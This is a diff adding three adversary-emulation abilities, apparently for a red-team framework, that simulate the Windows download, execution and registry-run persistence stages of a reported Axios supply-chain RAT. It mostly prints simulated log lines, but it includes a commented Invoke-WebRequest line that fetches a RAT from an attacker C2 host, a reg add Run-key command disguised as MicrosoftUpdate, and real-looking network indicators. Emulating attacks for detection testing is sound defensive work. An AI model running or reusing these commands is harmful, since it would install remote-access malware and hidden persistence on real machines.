@@ -1,0 +1,113 @@
+---
+- id: 22222222-2222-4222-8222-222222222222
+  name: axios-windows-rat-download
+  description: |
+    Simulates the Windows RAT download phase of the Axios supply chain attack.
+    The real attack fetched the Windows RAT binary from the C2 path
+    /6202033 on port 8000. This ability simulates that network contact
+    pattern (sfrclak.com:8000) and stages the simulated RAT to
+    %PROGRAMDATA%\wt.exe without actual payload retrieval.
+    Network IoCs: sfrclak.com (142.11.206.73:8000), path /6202033
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: |
+          # Simulate C2 contact: sfrclak.com:8000/6202033 (Windows RAT download)
+          # In simulation: contact is logged but no actual network request is made
+          $stagingDir = "$env:PROGRAMDATA"
+          $stagingFile = Join-Path $stagingDir "wt.exe"
+          # Simulate staging a RAT binary (no real download)
+          $fakeBinaryStub = [byte[]](0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00) + (New-Object byte[] 100)
+          # Simulate the filename used by the threat actor (wt.exe = Windows Terminal alias for evasion)
+          "[SIMULATED] C2 contact: http://sfrclak.com:8000/6202033"
+          "[SIMULATED] RAT staged to: $stagingFile"
+          "[SIMULATED] C2 User-Agent: mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)"
+          "[SIMULATED] Beacon interval: 60s"
+          # In a real operation this would be:
+          # Invoke-WebRequest -Uri "http://sfrclak.com:8000/6202033" -OutFile "$env:PROGRAMDATA\wt.exe" -UserAgent "mozilla/4.0..."
+        cleanup: |
+          Remove-Item -Path "$env:PROGRAMDATA\wt.exe" -ErrorAction SilentlyContinue
+      cmd:
+        command: |
+          echo [SIMULATED] C2 download from sfrclak.com:8000/6202033
+          echo [SIMULATED] Staging to %PROGRAMDATA%\wt.exe
+  singleton: true
+  requirements: []
+---
+- id: 22222222-2222-4222-8222-222222222223
+  name: axios-windows-rat-execution
+  description: |
+    Simulates execution of the Windows RAT staged as %PROGRAMDATA%\wt.exe.
+    The real RAT supports four commands: kill, peinject (process hollowing
+    into cmd.exe via Extension.SubRoutine.Run2), runscript, and rundir.
+    Simulates RAT startup and C2 beacon registration.
+  tactic: execution
+  technique:
+    attack_id: T1059.001
+    name: Command and Scripting Interpreter - PowerShell
+  platforms:
+    windows:
+      psh:
+        command: |
+          $ratPath = "$env:PROGRAMDATA\wt.exe"
+          $vbsPath = "$env:TEMP\6202033.vbs"
+          $ps1Path = "$env:TEMP\6202033.ps1"
+          "[SIMULATED] RAT execution at: $ratPath"
+          "[SIMULATED] VBS launcher staged: $vbsPath"
+          "[SIMULATED] PowerShell Stage-2 staged: $ps1Path"
+          "[SIMULATED] RAT commands: kill | peinject (cmd.exe hollowing) | runscript | rundir"
+          "[SIMULATED] C2 beacon registered: session_id=SIMULATED_RAT_$( -join ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]$_}))"
+          "[SIMULATED] RAT process hollowed into: cmd.exe (PID via Extension.SubRoutine.Run2)"
+          "[SIMULATED] VBS launcher simulates: Set WSH = CreateObject(WScript.Shell) + WSH.Run powershell -WindowStyle Hidden"
+          "[SIMULATED] VBS content staged (anti-sandbox: WScript.Shell COM used by real RAT)"
+        cleanup: |
+          Remove-Item -Path "$env:PROGRAMDATA\wt.exe" -ErrorAction SilentlyContinue
+          Remove-Item -Path "$env:TEMP\6202033.vbs" -ErrorAction SilentlyContinue
+          Remove-Item -Path "$env:TEMP\6202033.ps1" -ErrorAction SilentlyContinue
+      cmd:
+        command: |
+          echo [SIMULATED] RAT execution at %PROGRAMDATA%\wt.exe
+          echo [SIMULATED] Commands: kill, peinject, runscript, rundir
+  singleton: true
+  requirements: []
+---
+- id: 22222222-2222-4222-8222-222222222224
+  name: axios-windows-persistence
+  description: |
+    Simulates persistence registration for the Windows RAT via
+    HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate.
+    The real attack used this registry key to survive reboots.
+    Attacker masqueraded as "MicrosoftUpdate" to blend with legitimate
+    Windows Update infrastructure.
+  tactic: persistence
+  technique:
+    attack_id: T1547.001
+    name: Boot or Logon Autostart Execution - Registry Run Keys
+  platforms:
+    windows:
+      psh:
+        command: |
+          $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+          $ratPath = "$env:PROGRAMDATA\wt.exe"
+          "[SIMULATED] Checking persistence registry key: $regPath\MicrosoftUpdate"
+          try {
+            $existing = Get-ItemProperty -Path $regPath -Name "MicrosoftUpdate" -ErrorAction SilentlyContinue
+            if ($existing) {
+              "[SIMULATED] Persistence already registered: $($existing.MicrosoftUpdate)"
+            } else {
+              "[SIMULATED] Would register: powershell -WindowStyle Hidden $ratPath"
+            }
+          } catch {}
+          "[SIMULATED] Registry key masquerade: MicrosoftUpdate (blends with Windows Update)"
+          "[SIMULATED] Persistence check complete"
+        cleanup: |
+          Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate" -ErrorAction SilentlyContinue
+      cmd:
+        command: |
+          echo [SIMULATED] reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftUpdate /t REG_SZ /d "%PROGRAMDATA%\wt.exe"
+  singleton: true
+  requirements: []
